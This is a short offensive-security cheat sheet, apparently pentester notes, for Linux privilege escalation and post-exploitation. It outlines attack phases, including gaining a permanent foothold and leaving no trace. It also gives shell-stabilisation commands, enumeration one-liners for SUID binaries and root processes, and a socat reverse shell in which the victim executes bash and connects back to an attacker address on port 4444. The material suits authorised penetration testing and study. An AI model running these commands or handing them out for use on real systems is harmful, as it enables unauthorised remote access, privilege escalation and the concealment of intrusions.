# Cheat Sheet
___________

    Recon - Scan for vulnarable targets, gather info on target.
    Collect - Enumeration, more enumeration and some more enumeration.
    Process - Sort through data, analyse and prioritisation.
    Search - Know what to search for and where to find the exploit code.
    	Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
    	Locating other services running or applications installed that may be abusable (SUID & out of date software)
    	Looking for automated scripts like backup scripts (exploiting crontabs)
    	Credentials (user accounts, application config files..)
    	Mis-configured file and directory permissions
    Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
    Try - Get ready for (lots of) trial and error.
    Stay - Get a permanent foothold
    Cleanup - Leave no trace behinde
___________

## Stabilize Shell

python -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

stty raw -echo; fg


## Get reverse shell

atk:
socat file:`tty`,raw,echo=0 tcp-listen:4444
victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444


## Useful enumeration comands
### List all processes runing as root
```
ps -aux | grep root
```
### List all executibles with SUID set
```
find / -perm -u=s -type f 2>/dev/null
```
### Start a quick HTTP server
```
python3 -m http.server [PORT]
```
## Usefull common Linux commands

Make file executable
```
chmod +x filename
```
Double click in terminal
```
xdg-open [FILENAME]
```
What shell am I using
```
echo $0
```
Only show matches
```
2> /dev/null
```

